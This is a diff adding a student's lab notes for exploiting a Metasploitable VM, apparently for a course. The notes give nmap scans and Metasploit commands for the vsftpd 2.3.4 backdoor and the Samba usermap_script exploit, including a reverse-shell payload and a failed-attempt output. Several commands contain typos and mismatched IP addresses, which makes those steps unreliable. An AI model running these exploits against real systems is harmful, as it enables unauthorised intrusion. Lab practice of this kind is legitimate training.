@@ -1,0 +1,36 @@
+week 8 Metasploit and gain Control 
+-downlaod metasploitable-Linux from github 
+github.com/rampriyakilar/ice-needs
+-after download & open in vmworkstation
+-Enter username & pass : msfadmin
+-close that meta & open kali
+-nmap-v -A 193.168.23.129
+-msf console
+-search vsftpd
+-use exploit/unix/ftp/vsftpd_234_backdoor
+-set RHOST 192.168.23.129
+-info
+-show payloads
+-set payload/cmd/unox/interact 
+-exploit
+-ls-back
+Reopen kali cmd terminal 
+-nmap -v -A 193.168.23.129 
+-msf console 
+-search samba
+-use exploit/multi/samba/usermap_script
+-info
+-set RHOST 192.168.23.129 
+-info
+-show payloads
+-set payload /cmd/unix/reverse 
+-info
+-exploit 
+output:
+192.168.23.129:139 - Exploit failed [unreachable]: 
+Rex::ConnectionTimeout The connection with (192.168.23.129:139) timed out.
+Exploit completed, but no session was created.
+
+-ls
+-back
+
